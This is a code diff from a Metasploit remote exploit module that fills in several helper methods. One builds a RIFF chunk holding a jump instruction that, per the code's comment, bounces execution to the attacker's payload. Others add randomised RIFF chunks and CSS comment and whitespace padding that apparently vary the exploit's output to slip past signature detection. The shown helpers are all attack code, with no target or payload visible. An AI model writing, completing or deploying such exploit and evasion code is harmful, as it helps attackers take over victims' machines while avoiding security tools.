@@ -296,23 +296,40 @@ class MetasploitModule < Msf::Exploit::Remote
   # jump. This is used to bounce to the actual payload
   #
   def generate_trampoline_riff_chunk
-
+    tag = Rex::Text.to_rand_case(rand_text_alpha(4))
+    dat = "\xe9\xff\xff\xff\xff" + rand_text(1) + (rand_text(rand(256)+1) * 2)
+    tag +       [dat.length].pack('V') + dat
   end
 
   def generate_riff_chunk(len = (rand(256)+1) * 2)
-
+    tag = Rex::Text.to_rand_case(rand_text_alpha(4))
+    dat = rand_text(len)
+    tag + [dat.length].pack('V') + dat
   end
 
   def generate_css_padding
-
+    buf =
+      generate_whitespace() +
+      "/*" +
+      generate_whitespace() +
+      generate_padding() +
+      "*/" +
+      generate_whitespace()
   end
 
   def generate_whitespace
+    len = rand(100)+2
+    set = "\x09\x20\x0d\x0a"
+    buf = ''
 
+    while (buf.length < len)
+      buf << set[rand(set.length)].chr
+    end
+    buf
   end
 
   def generate_padding
-
+    rand_text_alphanumeric(rand(128)+4)
   end
 
 end
